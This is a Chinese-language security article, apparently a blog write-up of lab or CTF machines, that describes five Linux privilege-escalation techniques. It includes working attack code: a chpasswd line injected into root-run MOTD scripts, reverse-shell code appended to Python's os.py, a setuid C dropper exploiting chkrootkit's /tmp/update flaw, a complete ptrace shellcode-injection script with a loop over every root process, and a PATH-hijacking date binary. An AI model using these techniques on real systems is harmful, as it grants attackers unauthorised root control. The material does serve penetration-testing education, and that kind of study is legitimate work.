## 谈谈linux中那些非常规提权及其应用场景

### 0x01 MOTD注入提权

**提权原理：**motd是message of the
day这句话的缩写，当我们通过ssh登录成功的时候，我们如果留意的话，我们会发现输出的那些欢迎信息和日期等等，如果这些输出以上信息的脚本是以root权限运行的，并且我们当前这个用户对这些文件可读可写，那么提权思路就有了，我们可以通过在这些sh脚本中写入一个修改root用户密码的命令，这样当我们通过ssh用户登录到inferno这个账号上的时候，我们这些motd的sh脚本就会被以root用户的权限执行，这时候我们写入的修改root用户密码的命令也会被执行，之后我们只需要切换到root用户即可完成提权。

 **应用场景：**

接下来我们通过下面这条命令找一些属主是root 普通用户或组可执行 其他用户可写的文件，这种文件往往可以帮助我们实现权限提升。

    
    
    find / -type f -user root -perm -ug=x,o=w -exec ls -l '{}' \; 2>/dev/null
    
    #命令解释：
    从根目录下开始查找 文件类型 属主是root 普通用户或组可执行 其他用户可写  如果发现了符合条件的用 ls -l命令显示  错误信息从定向到null
    

![图片.png](https://image.3001.net/images/20221105/1667663754_6366878a601516be706dd.png!small)

先cat了一下搜索到的第一个文件，发现里面有brainfuck加密的内容，所以尝试解密下。

![图片.png](https://image.3001.net/images/20221105/1667663760_6366879068952d6231ee9.png!small)

在线解密网站：http://bf.doleczek.pl/

![图片.png](https://image.3001.net/images/20221105/1667663765_63668795f2e356713d435.png!small)

    
    
    chitragupt
    

解密得到的这个可能是某个用户的密码，所以根据查看/etc/passwd文件发现的用户，挨个尝试下。

![图片.png](https://image.3001.net/images/20221105/1667663773_6366879d61fcae05f0cd7.png!small)

当我尝试切换到interno用户的时候，使用揭秘得到的这个字符串成功的su到了inferno用户上。到这里算是完成了从www-data权限到普通用户权限的权限提升。

![图片.png](https://image.3001.net/images/20221105/1667663780_636687a4cafe3d6b2a964.png!small)

然后我们在inferno用户的家目录下发现了第一个flag。

![图片.png](https://image.3001.net/images/20221105/1667663786_636687aaae8e2e7f356cf.png!small)

既然已经获取到了inferno用户的密码，我接下来尝试使用ssh登录到inferno用户上。

    
    
    ssh inferno@192.168.26.131
    

成功登录到inferno用户后再次执行下面这条命令

    
    
    find / -type f -user root -perm -ug=x,o=w -exec ls -l '{}' \; 2>/dev/null
    

![图片.png](https://image.3001.net/images/20221105/1667663798_636687b6269ef0f0f336e.png!small)

我观察到除了我们刚刚发现密码的那个文件，其他文件都在/etc/update-motd.d/这个目录下，motd是message of the
day这句话的缩写，我们通过ssh登录成功后看到的那些欢迎和提示的信息都是motd目录下存放的这些sh脚本所提供的。

![图片.png](https://image.3001.net/images/20221105/1667663853_636687eda25e29758cab0.png!small)

那么现在我们知道了，当我们通过ssh登录成功的时候，这些sh脚本会以root权限运行输出那些欢迎信息和日期等等，并且我们当前这个用户对这些文件可读可写，那么提权思路就有了，我们可以通过在这些sh脚本中写入一个修改root用户密码的命令，这样当我们通过ssh用户登录到inferno这个账号上的时候，我们这些motd的sh脚本就会被以root用户的权限执行，这时候我们写入的修改root用户密码的命令也会被执行，之后我们只需要切换到root用户即可完成提权，思路有了下面开始操作。

    
    
    vi /etc/update-motd.d/00-header      #编辑这个文件
    echo 'root:123' | chpasswd        #在文件末尾添加这一行，这行的意思就是，使用chpasswd命令将root用户的密码修改为123
    

![图片.png](https://image.3001.net/images/20221105/1667663897_6366881923d965dd21393.png!small)

然后保存修改后，退出ssh的连接，然后重新使用ssh登录，即可触发执行我们修改root用户的命令，

![图片.png](https://image.3001.net/images/20221105/1667663903_6366881f65300ace60724.png!small)

当我们看到登录成功后的欢迎语的时候，root用户的密码已经成功的被我们修改成了123，接着只需要su到root用户即可提权成功

![图片.png](https://image.3001.net/images/20221105/1667663911_63668827172db1b391a70.png!small)

### 0x02 pyhton-OS库代码注入提权

**提权原理：**python的OS库有写权限，那我们接下来就传pspy64到该机器上来，然后看看有没有以root用户定期执行的py脚本调用了os库，如果有的话，我们在OS库中写入反弹shell的代码，这样当该脚本被执行时，我们就会获得一个root权限的shell

    
    
    这里介绍两个工具：
    linpeas.sh这个工具会自动搜索可能的本地权限提升路径，并以漂亮的颜色和简洁的格式输出，以便我们可以轻松识别错误配置。 
    linpeas.sh:    https://github.com/carlospolop/PEASS-ng
    pspy是一个命令行工具，旨在侦听进程而无需 root 权限。 它允许我们在执行时查看其他用户、cron 作业等运行的命令和进程。
    pspy64:        https://github.com/DominicBreuker/pspy/
    

**应用场景：**

当我们使用linpeas.sh对目标机器进行信息搜集的时候我们发现了一个不同寻常的文件os.py

![图片.png](https://image.3001.net/images/20221105/1667663925_636688352188cd47281c5.png!small)

发现我们竟然对python的OS库有写权限，那我们接下来就传pspy64到该机器上来，然后看看有没有以root用户定期执行的py脚本调用了os库，如果有的话，我们在OS库中写入反弹shell的代码，这样当该脚本被执行时，我们就会获得一个root权限的shell

![图片.png](https://image.3001.net/images/20221105/1667663933_6366883d146c9ccd74ce5.png!small)

![图片.png](https://image.3001.net/images/20221105/1667663939_63668843d6113ff8cb1c1.png!small)

然后如上图所示，我们看到这个脚本是以root权限运行的，并且该脚本调用了OS库，所以接下来我们只需要在OS库中写入反弹shell的代码即可，如下图所示

![图片.png](https://image.3001.net/images/20221105/1667663946_6366884a2a240043e23fe.png!small)

上图框中的代码就是我们加到os.py文件末尾反弹shell的代码，通过下图我们可以看到root权限的shell已经弹回来了

![图片.png](https://image.3001.net/images/20221106/1667664021_6366889589f68b47e0c03.png!small)

### 0x03 Chkrootkit 提权

**提权原理：**chkrootkit 是一个在本地检查 rootkit
迹象的工具，chkrootkit有crontab，会定期以root身份执行/tmp/update文件。如果攻击者知道管理员是定期运行chkrootkit(通过查看cron.daily获知)，并且对/
tmp(没有挂载noexec)有写访问权限，就可以利用该漏洞获取root权限。

**影响范围：**Chkrootkit <=0.49 Local Root Vulnerability：小于等于0.49版的chrootkit本地提权漏洞。

 **应用场景：**

    
    
    python -m http.server 80           #起一个临时的http服务
    wget 10.10.10.43:8080/pspy64       #将pspy下载到目标机器
    chmod +x pspy64
    ./pspy64                           #运行pspy查看当前目标机器的进程
    

![图片.png](https://image.3001.net/images/20221106/1667664033_636688a1ea53c78b12b94.png!small)

然后我们可以在 /tmp 目录下新建 update.c（代码实示例如下）：

    
    
    #include <unistd.h>
    void main(void)
    {
    system("chown root:root /tmp/update");
    system("chmod 4755 /tmp/update");
    setuid(0);
    setgid(0);
    exec("/bin/sh","sh",NULL);
    }
    

然后编译好 update ，等待chkrookit以root身份执行/tmp/update文件后，我们就可以得到一个root权限的shell

### 0x04 python Capabilities cap_sys_ptrace+ep提权

    
    
    补充知识：
    Capabilities机制是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID=0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。
    
    这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。
    
    如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。
    

**提权原理：**利用pythono具备的cap_sys_ptrace+ep
能力对root权限的进程注入python类型shellcode，以此实现权限提升。

 **应用场景：**

我们可以使用下面的这条命令可以用于发现具有Capabilities特殊操作权限的程序

    
    
    /usr/sbin/getcap -r / 2>/dev/null      # -r 递归查询 2>/dev/null 错误信息从定向到null
    

![图片.png](https://image.3001.net/images/20221106/1667664061_636688bd8d5c74ed1bea1.png!small)

通过上图我们发现python具备cap_sys_ptrace+ep
能力，所以我们可以对其进行利用然后进行提权。这里需要用到一个提权脚本，这个脚本的作用就是对root权限的进程注入python类型shellcode，利用pythono具备的cap_sys_ptrace+ep
能力实现权限提升，该脚本如果执行成功，会在靶机的本地监听5600端口，我们也可以修改shellcode部分让其监听其他端口。

脚本内容：

    
    
    # inject.py
    # The C program provided at the GitHub Link given below can be used as a reference for writing the python script.
    # GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c 
    
    import ctypes
    import sys
    import struct
    
    # Macros defined in <sys/ptrace.h>
    # https://code.woboq.org/qt5/include/sys/ptrace.h.html
    
    PTRACE_POKETEXT   = 4
    PTRACE_GETREGS    = 12
    PTRACE_SETREGS    = 13
    PTRACE_ATTACH     = 16
    PTRACE_DETACH     = 17
    
    # Structure defined in <sys/user.h>
    # https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
    
    class user_regs_struct(ctypes.Structure):
        _fields_ = [
            ("r15", ctypes.c_ulonglong),
            ("r14", ctypes.c_ulonglong),
            ("r13", ctypes.c_ulonglong),
            ("r12", ctypes.c_ulonglong),
            ("rbp", ctypes.c_ulonglong),
            ("rbx", ctypes.c_ulonglong),
            ("r11", ctypes.c_ulonglong),
            ("r10", ctypes.c_ulonglong),
            ("r9", ctypes.c_ulonglong),
            ("r8", ctypes.c_ulonglong),
            ("rax", ctypes.c_ulonglong),
            ("rcx", ctypes.c_ulonglong),
            ("rdx", ctypes.c_ulonglong),
            ("rsi", ctypes.c_ulonglong),
            ("rdi", ctypes.c_ulonglong),
            ("orig_rax", ctypes.c_ulonglong),
            ("rip", ctypes.c_ulonglong),
            ("cs", ctypes.c_ulonglong),
            ("eflags", ctypes.c_ulonglong),
            ("rsp", ctypes.c_ulonglong),
            ("ss", ctypes.c_ulonglong),
            ("fs_base", ctypes.c_ulonglong),
            ("gs_base", ctypes.c_ulonglong),
            ("ds", ctypes.c_ulonglong),
            ("es", ctypes.c_ulonglong),
            ("fs", ctypes.c_ulonglong),
            ("gs", ctypes.c_ulonglong),
        ]
    
    libc = ctypes.CDLL("libc.so.6")
    
    pid=int(sys.argv[1])
    
    # Define argument type and respone type.
    libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
    libc.ptrace.restype = ctypes.c_uint64
    
    # Attach to the process
    libc.ptrace(PTRACE_ATTACH, pid, None, None)
    registers=user_regs_struct()
    
    # Retrieve the value stored in registers
    libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
    
    print("Instruction Pointer: " + hex(registers.rip))
    
    print("Injecting Shellcode at: " + hex(registers.rip))
    
    # Shell code copied from exploit db.
    shellcode="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
    
    # Inject the shellcode into the running process byte by byte.
    for i in xrange(0,len(shellcode),4):
     
      # Convert the byte to little endian.
      shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
      shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
      shellcode_byte=int(shellcode_byte_little_endian,16)
     
      # Inject the byte.
      libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
    
    print("Shellcode Injected!!")
    
    # Modify the instuction pointer
    registers.rip=registers.rip+2
    
    # Set the registers
    libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
    
    print("Final Instruction Pointer: " + hex(registers.rip))
    
    # Detach from the process.
    libc.ptrace(PTRACE_DETACH, pid, None, None)
    

因为需要找root进程进行注入，所以简单写个shell脚本对root进程进行批量尝试

    
    
    for i in `ps -ef|grep root|grep -v "grep"|awk '{print $2}'`; do python2.7 inject.py $i; done
    

![图片.png](https://image.3001.net/images/20221106/1667664084_636688d496b108bd07004.png!small)

通过上图我们已经看到靶机的5600端口已经监听，说明我们的脚本成功执行了，接下来我们回到kali用nc去连接靶机的5600端口即可。

![图片.png](https://image.3001.net/images/20221106/1667664093_636688ddb699cc6a8b25a.png!small)

通过上图我们可以看到我们成功实现了权限的提升，获取到了root权限

### 0x05 用户自定义命令导致的环境变量提权

**提权原理：**本质上还是linux环境变量提权的那个原理，我之所以把这个提权案例拿过来，是因为我认为发现和分析用户自定义文件的这个过程及其思想是有价值的。环境变量提权的原理我之前写过一篇文章，感兴趣的师傅可以去看看，链接如下：https://www.freebuf.com/articles/system/320593.html

 **应用场景：**

通过常规的信息搜集，我发现内核提权和常规的sudo等提权手段都不可行，但是在使用以下命令的时候，发现了listinfo

这个命令，感觉这个可能是用户自定义的一个命令，于是开始对其进行测试

    
    
    find / -user root -type f -perm -u+sx -ls 2>/dev/null
    #使用该命令可以列出 属于root账号且有suid权限的可执行文件    2>/dev/null部分的意思是不显示一些报错
    

![图片.png](https://image.3001.net/images/20221106/1667664102_636688e63afa89e311227.png!small)

如下图所示，我们可以看到listinfo是一个可执行文件

![图片.png](https://image.3001.net/images/20221106/1667664111_636688ef01af7ef0cedc6.png!small)

于是我尝试执行了一下listinfo命令

![图片.png](https://image.3001.net/images/20221106/1667664116_636688f42c6212ef2768b.png!small)

通过对执行结果的分析，我发现listinfo命令执行的内容大概分为四个部分，第一个部分是显示一些网卡的配置信息，第二、三部分是22和80端口开放情况，第四部分是打印当前时间。

使用下面这条命令可以查看该可执行程序中的一些可打印字符串

    
    
    strings /usr/bin/listinfo
    

![图片.png](https://image.3001.net/images/20221106/1667664130_63668902b42ed2de39a10.png!small)

通过上图我们发现，该可执行程序的确是执行了如我分析的那样的四条命令，但是我们可以发现前三条命令都写绝对路径了，但是第四条命令date却没有写路径，所以我们可以利用这一点实现linux环境变量提权。关于环境变量提权的原理我之前写过一篇文章，感兴趣的师傅可以去看看，链接如下：https://www.freebuf.com/articles/system/320593.html

相信读了我上面的这篇文章，应该对该提权的的原理有了一定的了解，接下来我们开始操作，先在当前用户的目录下创建一个date.c文件

    
    
    cd  /home/gemini1
    vi date.c
    

date.c文件的内容如下，大概的意思就是以root用户的身份执行系统命令，启动一个shell

    
    
    #include <sys/types.h>
    #include <unistd.h>
    #include <stdlib.h>
    
    int main() {
     setuid(0);
     setgid(0);
     system("/bin/bash");
    }
    
    
    
    gcc date.c -o date    #对该c文件编译，并把编译好的文件命名为date
    

然后我这里要补充的一点就是大家知道为什么操作系统可以直接执行ls、pwd这些命令吗？其实是因为这些系统命令所对应的可执行文件的目录都已经够被设置成了环境变量。

    
    
    echo $PATH        #查看系统的环境变量
    

由于这些命令都是放在这些系统路径里面的所以我们才不需要输入完整的路径就可以执行这些命令，原理和windows环境变量一样，这里不再多说。

    
    
    which date
    

通过上面这条命令
我们可以知道系统默认的date命令的路径，是放在/bin这个路径下的，而/bin目录是在系统环境变量里面的，所以系统会在系统变量里面从前往后检索，从而在/bin目录下找到date这个可执行程序，从而成功执行date命令。

了解了linux命令执行和环境变量的关系，下面的操作就好理解了，现在我们的目标就是想让系统先检索到我们构造的date命令，所以我们需要将当前目录添加到当前环境变量的头部。

    
    
    export PATH=/home/gemini1:$PATH
    

如下图所示，此时我们构造的date文件的路径已经被放在了环境变量的头部

![图片.png](https://image.3001.net/images/20221106/1667664146_63668912977db378de1b6.png!small)

然后我们执行listinfo触发执行date命令，这次执行的date命令就是我们构造的恶意代码了。

![图片.png](https://image.3001.net/images/20221106/1667664152_63668918d92befcdb6e24.png!small)

通过下图我们可以看到已经提权成功，获取到了root权限。

![图片.png](https://image.3001.net/images/20221106/1667664158_6366891e92c5fc8e45d8f.png!small)

### 0x06 总结

其实，如果认真思考的话，我们会发现上面那些提权的思路和方法，有很多都是可以复用的经验，希望这篇文章可以拓宽师傅们的linux提权思路和方法。

